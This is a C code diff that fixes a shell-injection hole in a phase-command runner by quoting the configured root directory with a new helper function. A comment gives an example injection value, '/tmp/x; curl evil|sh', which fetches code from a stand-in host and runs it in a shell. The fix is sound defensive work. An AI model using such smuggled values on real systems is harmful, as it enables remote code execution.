@@ -153,11 +153,31 @@ json_t *runner_verify_result_to_dict(
     return obj;
 }
 
+/* shlex.quote for a command word (ASCII-safe set, single-quote otherwise). */
+static void vr_shquote(const char *in, char *out, size_t outsz) {
+    size_t p = 0;
+    int safe = (in && *in);
+    for (const unsigned char *c = (const unsigned char *)(in ? in : ""); *c && safe; c++) {
+        if ((*c >= 'a' && *c <= 'z') || (*c >= 'A' && *c <= 'Z') || (*c >= '0' && *c <= '9')) continue;
+        if (strchr("_@%+=:,./-", *c)) continue;
+        safe = 0;
+    }
+    if (safe) { snprintf(out, outsz, "%s", in); return; }
+    if (p + 1 < outsz) out[p++] = '\'';
+    for (const char *c = in ? in : ""; *c && p + 6 < outsz; c++) {
+        if (*c == '\'') { memcpy(out + p, "'\"'\"'", 5); p += 5; }
+        else out[p++] = *c;
+    }
+    if (p + 1 < outsz) out[p++] = '\'';
+    out[p < outsz ? p : outsz - 1] = '\0';
+}
+
 /* ── _run_phase_command: run a shell command with timeout ── */
 /* PoP: runner_run_phase_command @ agent/verify/runner.py:_run_phase_command */
 json_t *runner_run_phase_command(
     const char *phase,
     const char *command,
+
     const char *root,
     double timeout_sec)
 {
@@ -167,7 +187,11 @@ json_t *runner_run_phase_command(
     /* Build the command: cd root && command */
     char cmd[8192];
     if (root) {
-        snprintf(cmd, sizeof(cmd), "cd %s && %s", root, command ? command : "true");
+        /* The root comes from user config (a phase's working directory); interpolated raw it
+         * broke on any space and let a path like "/tmp/x; curl evil|sh" run a second command. */
+        char qroot[4096];
+        vr_shquote(root, qroot, sizeof qroot);
+        snprintf(cmd, sizeof(cmd), "cd %s && %s", qroot, command ? command : "true");
     } else {
         snprintf(cmd, sizeof(cmd), "%s", command ? command : "true");
     }
